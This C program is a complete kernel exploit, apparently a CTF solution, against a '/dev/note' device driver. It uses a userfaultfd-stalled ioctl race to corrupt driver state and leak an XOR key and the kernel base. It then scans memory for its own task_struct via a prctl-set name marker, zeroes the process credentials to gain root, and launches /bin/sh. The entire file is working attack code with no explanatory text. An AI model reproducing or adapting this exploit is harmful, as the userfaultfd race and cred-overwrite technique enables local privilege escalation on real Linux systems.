#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <sys/prctl.h>

#include "userfaultfd_tool.h"

typedef struct Arg{
    size_t index;
    size_t size;
    char *addr;
}Arg;

#define CREATE 0xFFFFFF00
#define EDIT 0xFFFFFF01
#define SHOW 0xFFFFFF02
#define RELOAD 0xFFFFFF03

char *fault_page;
int fd;

void *fault_edit(void *index)
{
    Arg arg;

    arg.index = (int)index;
    arg.size = 0x28;
    arg.addr = fault_page;
    ioctl(fd, EDIT, &arg);
    fault_page += page_size;
}

inline static int search(register size_t *ptr)
{
    register int i;
    for(i = 0; i < 0xf0/8; i++)
    {
        if(ptr[i] == 0x6161616161616161)
        {
            if(i - 2 >= 0 && ptr[i-1] > 0xff00000000000000 && ptr[i-2] > 0xff00000000000000)
            {
                return i;
            }
        }
    }
    return 0;
}

int main()
{
    Arg arg, arg2;
    pthread_t tid;
    char *buf = NULL, *temp, *base;
    size_t xor_key, offset_addr, container[0x40], offset, *ptr, cred_addr, page_offset_base;
    int postion, i, result;
    register int sign = 0;

    if ((fd = open("/dev/note", O_RDONLY)) < 0)
    {
        errExit("open");
    }

    buf = mmap((void *)0xabc000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(buf == NULL)
    {
        errExit("mmap");
    }

    fault_page = get_userfault_page(1);

    arg.size = 0x8;
    arg.addr = buf;
    ioctl(fd, CREATE, &arg);

    arg.size = 0x8;
    arg.addr = buf;
    ioctl(fd, CREATE, &arg);

    temp = PAGE_COPY_ADDR;
    temp[0] = 0x80;
    pthread_create(&tid, NULL, fault_edit, (void *)1 );
    usleep(100 * 1000);

    ioctl(fd, RELOAD, &arg);

    arg.size = 0x18;
    arg.addr = buf;
    ioctl(fd, CREATE, &arg);

    arg.size = 0x8;
    arg.addr = buf;
    ioctl(fd, CREATE, &arg);
    
    release_fault_page();
    pthread_join(tid, NULL);

    arg.size = 0x8;
    arg.addr = buf;
    ioctl(fd, CREATE, &arg);
    
    memset(buf, 0, 0x1000);
    arg.index = 1;
    arg.addr = buf;
    ioctl(fd, SHOW, &arg);

    print_hex(buf, 0xf0, 1);

    xor_key = *(size_t *)(buf + 48);
    printf("xor_key: 0x%lx\n", xor_key);
    offset_addr = *(size_t *)(buf + 0x18) ^ xor_key;
    printf("offset_addr: 0x%lx\n", offset_addr);
    page_offset_base = xor_key & 0xffffffff00000000;
    printf("page_offset_base: 0x%lx\n", page_offset_base);

    prctl(PR_SET_NAME, "aaaaaaaa");
    container[1] = xor_key;
    container[2] = xor_key ^ 0xf0;
    arg.index = 1;
    arg.addr = container;
    arg2.index = 2;
    arg2.addr = buf;
    puts("start search task_struct");
    for(offset = 0; ; offset += 0xf0)
    {
        container[3] = xor_key ^ offset;

        ioctl(fd, EDIT, &arg);
        ioctl(fd, SHOW, &arg2);
        if( search(buf) )
        {
            result = search(buf);
            break;
        }
    }

    print_hex(buf, 0xf0, 1);
    ptr = (size_t *)buf;
    cred_addr = ptr[result - 2];
    printf("cred_addr: 0x%lx\n", cred_addr);

    container[1] = xor_key;
    container[2] = xor_key ^ 32;
    container[3] = xor_key ^ (cred_addr - page_offset_base + 4);
    ioctl(fd, EDIT, &arg);

    memset(buf, 0, 0x1000);
    arg2.index = 2;
    arg2.addr = buf;
    ioctl(fd, EDIT, &arg2);

    puts("success");
    system("/bin/sh");

    return 0;
}
